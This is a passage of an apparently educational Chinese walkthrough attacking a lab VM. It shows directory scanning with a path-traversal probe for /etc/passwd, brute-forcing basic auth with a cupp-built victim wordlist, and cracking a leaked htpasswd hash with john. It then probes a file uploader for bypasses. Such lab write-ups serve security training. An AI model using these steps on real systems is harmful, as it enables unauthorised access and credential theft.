data-num="30"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  293B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>httr<span class="token operator">-</span>oauth</pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    1KB <span class="token operator">-</span> <span class="token operator">/</span><span class="token constant">LICENSE</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    4KB <span class="token operator">-</span> <span class="token operator">/</span><span class="token constant">README</span><span class="token punctuation">.</span>md</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  290B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  306B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">cgi-bin</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  314B  <span class="token operator">-</span> <span class="token operator">/</span>css  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>css<span class="token operator">/</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">401</span> <span class="token operator">-</span>  481B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">development</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  290B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>api<span class="token operator">/</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  301B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>en<span class="token operator">/</span>changes<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  300B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>stable<span class="token punctuation">.</span>version</pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  301B  <span class="token operator">-</span> <span class="token operator">/</span>doc<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  286B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">doc</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    3KB <span class="token operator">-</span> <span class="token operator">/</span>gulpfile<span class="token punctuation">.</span>js</pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">301</span> <span class="token operator">-</span>  314B  <span class="token operator">-</span> <span class="token operator">/</span>img  <span class="token operator">-</span><span class="token operator">></span>  http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>img<span class="token operator">/</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   13KB <span class="token operator">-</span> <span class="token operator">/</span>index<span class="token punctuation">.</span>html</pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>  334B  <span class="token operator">-</span> <span class="token operator">/</span>index</pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    1KB <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">js</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>   21B  <span class="token operator">-</span> <span class="token operator">/</span>robots<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span>server<span class="token operator">-</span>status</pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">server-status</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token punctuation">[</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">32</span><span class="token operator">:</span><span class="token number">53</span><span class="token punctuation">]</span> <span class="token number">200</span> <span class="token operator">-</span>    2KB <span class="token operator">-</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">vendor</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>Task Completed</pre></td></tr></table></figure><p>这里根据得到的信息可以发现几个有趣的目录，我们进去看一下：</p>
<p>在 <code>development</code>  页面我们发现了一个认证框：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180417846-890884622.png" alt="image" /></p>
<p>我们尝试一下暴力破解：</p>
<p>这里涉及到使用 <code>cupp工具</code> 生成密码字典，同样使用 <code>git指令</code> 下载安装</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>jeanphorn<span class="token operator">/</span>common<span class="token operator">-</span>password<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p>我们先用之前在主页获得的用户信息使用 <code>cupp脚本</code> 简单生成一个密码字典：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python2 cupp<span class="token punctuation">.</span>py <span class="token operator">-</span>i</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180443588-1482650771.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Insert the informations about the victim to make a dictionary</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> If you don't know all the info<span class="token punctuation">,</span> just hit enter when asked<span class="token operator">!</span> <span class="token punctuation">;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">></span> Name<span class="token operator">:</span> Frank</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">></span> Surname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">></span> Nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">></span> <span class="token function">Birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">></span> Wife<span class="token string">'s(husband'</span>s<span class="token punctuation">)</span> <span class="token function">birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">></span> Child's name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">></span> Child's nickname<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">></span> Child's <span class="token function">birthdate</span> <span class="token punctuation">(</span><span class="token constant">DDMMYYYY</span><span class="token punctuation">)</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">></span> Pet's name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">></span> Company name<span class="token operator">:</span> </pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">></span> Do you want to add some key words about the victim<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">></span> Do you want to add special chars at the end <span class="token keyword">of</span> words<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">></span> Do you want to add some random numbers at the end <span class="token keyword">of</span> words<span class="token operator">?</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token operator">></span> Leet mode<span class="token operator">?</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>e<span class="token punctuation">.</span> leet <span class="token operator">=</span> <span class="token number">1337</span><span class="token punctuation">)</span> <span class="token constant">Y</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token constant">N</span><span class="token punctuation">]</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Now making a dictionary<span class="token operator">...</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Sorting list and removing duplicates<span class="token operator">...</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Saving dictionary to frank<span class="token punctuation">.</span>txt<span class="token punctuation">,</span> counting <span class="token number">12</span> words<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Now load your pistolero <span class="token keyword">with</span> frank<span class="token punctuation">.</span>txt and shoot<span class="token operator">!</span> Good luck<span class="token operator">!</span></pre></td></tr></table></figure><p>使用 <code>bp抓包</code> ，记得打开浏览器的代理哦！</p>
<p>抓包发现网站使用 base64 编码认证（username:password），我们在这里添加爆破位置：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180520566-982677562.png" alt="image" /></p>
<p>使用用户自定义模式：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180536492-1899759655.png" alt="image" /></p>
<p>在第一个位置添加一些可能的用户名，第二个位置使用冒号分隔用户名和密码：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180601663-855826072.png" alt="image" /></p>
<p>在第三个位置加载一个常用密码字典和我们之前生成的密码字典：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180612738-356093366.png" alt="image" /></p>
<p>设置 base64 编码模式，关闭对特殊字符的 url 编码：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180627199-2118212303.png" alt="image" /></p>
<p>开始爆破：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180641562-989467674.png" alt="image" /></p>
<p>好吧，白高兴一场，并没有爆破成功 QAQ！</p>
<p>那就再去尝试下其他办法吧！</p>
<p>从之前得到的信息上我们可以发现有一个 <code>robots</code> ，那我们就去看一下 <code>robots.txt</code> ，看看有没有什么敏感目录：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180709605-1722574234.png" alt="image" /></p>
<p>好吧，还是什么都没有 ==、</p>
<p>再重新翻阅一下之前扫描目录时得到信息，发现这里有一份备份文件，下载下来看一下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">/</span>index<span class="token punctuation">.</span>html<span class="token punctuation">.</span>bak</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>h1<span class="token operator">></span>It works<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">&lt;</span>p<span class="token operator">></span>This is the <span class="token keyword">default</span> web page <span class="token keyword">for</span> <span class="token keyword">this</span> server<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>p<span class="token operator">></span>The web server software is running but no content has been added<span class="token punctuation">,</span> yet<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"/development"</span><span class="token operator">></span>development<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">I</span> will use frank<span class="token operator">:</span>$apr1$1oIGDEDK$<span class="token operator">/</span>aVFPluYt56UvslZMBDoC0 <span class="token keyword">as</span> the <span class="token punctuation">.</span>htpasswd file to protect the development path <span class="token operator">--</span><span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></pre></td></tr></table></figure><p>这里发现了一个密码泄露，很可能是之前认证页面的密码。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">frank</span><span class="token operator">:</span>$apr1$1oIGDEDK$<span class="token operator">/</span>aVFPluYt56UvslZMBDoC0</pre></td></tr></table></figure><p>使用 <code>touch命令</code> 创建一个 <code>passwd.txt</code>  文件，将其保存到里面，然后使用 <code>john</code>  进行爆破：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Created directory<span class="token operator">:</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">root</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span>john</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> detected hash type <span class="token string">"md5crypt"</span><span class="token punctuation">,</span> but the string is also recognized <span class="token keyword">as</span> <span class="token string">"md5crypt-long"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Use the <span class="token string">"--format=md5crypt-long"</span> option to force loading these <span class="token keyword">as</span> that type instead</pre></td></tr><tr><td data-num="4"></td><td><pre>Using <span class="token keyword">default</span> input encoding<span class="token operator">:</span> <span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span></pre></td></tr><tr><td data-num="5"></td><td><pre>Loaded <span class="token number">1</span> password <span class="token function">hash</span> <span class="token punctuation">(</span>md5crypt<span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token function">$1$</span> <span class="token punctuation">(</span>and variants<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token constant">MD5</span> <span class="token number">128</span><span class="token operator">/</span><span class="token number">128</span> <span class="token constant">AVX</span> 4x3<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Will run <span class="token number">2</span> OpenMP threads</pre></td></tr><tr><td data-num="7"></td><td><pre>Proceeding <span class="token keyword">with</span> single<span class="token punctuation">,</span> <span class="token literal-property property">rules</span><span class="token operator">:</span>Single</pre></td></tr><tr><td data-num="8"></td><td><pre>Press <span class="token string">'q'</span> or Ctrl<span class="token operator">-</span><span class="token constant">C</span> to abort<span class="token punctuation">,</span> almost any other key <span class="token keyword">for</span> status</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> Only <span class="token number">2</span> candidates buffered <span class="token keyword">for</span> the current salt<span class="token punctuation">,</span> minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Warning</span><span class="token operator">:</span> Only <span class="token number">20</span> candidates buffered <span class="token keyword">for</span> the current salt<span class="token punctuation">,</span> minimum <span class="token number">24</span> needed <span class="token keyword">for</span> performance<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="11"></td><td><pre>frank<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>         <span class="token punctuation">(</span>frank<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>1g <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token constant">DONE</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">3</span> <span class="token punctuation">(</span><span class="token number">2021</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">57</span><span class="token punctuation">)</span> <span class="token number">33</span><span class="token punctuation">.</span>33g<span class="token operator">/</span>s 6333p<span class="token operator">/</span>s 6333c<span class="token operator">/</span>s 6333C<span class="token operator">/</span>s <span class="token constant">FRANK1</span><span class="token punctuation">.</span><span class="token punctuation">.</span>fr4nk</pre></td></tr><tr><td data-num="13"></td><td><pre>Use the <span class="token string">"--show"</span> option to display all <span class="token keyword">of</span> the cracked passwords reliably</pre></td></tr><tr><td data-num="14"></td><td><pre>Session completed</pre></td></tr></table></figure><p>成功破解出密码为 <code>frank!!!</code> ，尝试登录：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180913173-457889153.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">*</span> Here is my unfinished tools list</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> the uploader <span class="token function">tool</span> <span class="token punctuation">(</span>finished but need security review<span class="token punctuation">)</span></pre></td></tr></table></figure><p>这次终于没有失败，我们成功进来了，而且在页面还发现提示，这里存在一个上传位置，我们尝试访问 <code>/uploader</code> ：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115180936496-1976919466.png" alt="image" /></p>
<p>得到一个文件上传页面 yeyeye！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181023735-276335209.png" alt="image" /></p>
<p>这里尝试几种绕过方式都没有成功，只能上传图片了，如果网站同时存在文件包含漏洞，那么我们就可以直接将上传的图片解析成 <code>php</code> 。</p>
<p>记得之前端口扫描时我们还发现存在 <code>8011端口</code> 也是 <code>http服务</code> ，我们先去看一看有没有可以利用的地方：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181056264-728944616.png" alt="image" /></p>
<p>没有太多的东西，同样我们也对这个目录进行扫描：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211115181107502-363517423.png" alt="image" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>_<span class="token operator">|</span><span class="token punctuation">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0<span class="token punctuation">.</span><span class="token number">4.2</span>                                           </pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">/</span><span class="token function">_</span><span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                                    </pre></td></tr><tr><td data-num="3"></td><td><pre>                                                                           </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">Extensions</span><span class="token operator">:</span> php<span class="token punctuation">,</span> aspx<span class="token punctuation">,</span> jsp<span class="token punctuation">,</span> html<span class="token punctuation">,</span> js <span class="token operator">|</span> <span class="token constant">HTTP</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token constant">GET</span> <span class="token operator">|</span> Threads<span class="token operator">:</span> <span class="token number">30</span> <span class="token operator">|</span> Wordlist size<span class="token operator">:</span> <span class="token number">10929</span>                                                          </pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>Output File<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>reports<span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span><span class="token operator">-</span><span class="token number">8011</span><span class="token operator">/</span><span class="token operator">-</span>_21<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_05</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>Error Log<span class="token operator">:</span> <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>dirsearch<span class="token operator">-</span>master<span class="token operator">/</span>logs<span class="token operator">/</span>errors<span class="token operator">-</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">12_05</span><span class="token operator">-</span><span class="token number">08</span><span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">.</span>log</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">Target</span><span class="token operator">:</span> http<span class="token operator">:</span><span class="token operator">/</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">192.168.56.118:8011</span><span class="token regex-delimiter">/</span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">]</span> Starting<span class="token operator">:</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token number">400</span> <span class="token operator">-</span>  308B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span><span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span><span class="token operator">%</span>2e<span class="token operator">%</span>2e<span class="token operator">/</span>etc<span class="token operator">/</span>passwd</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  295B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>ht_wsr<span class="token punctuation">.</span>txt</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>bak1</pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  300B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess<span class="token punctuation">.</span>sample</pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_sc</pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  298B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccess_orig</pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">[</span><span class="token number">05</span><span class="token operator">:</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token number">403</span> <span class="token operator">-</span>  296B  <span class="token operator">-</span> <span class="token operator">/</span><span class="token punctuation">.</span>htaccessBAK</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token 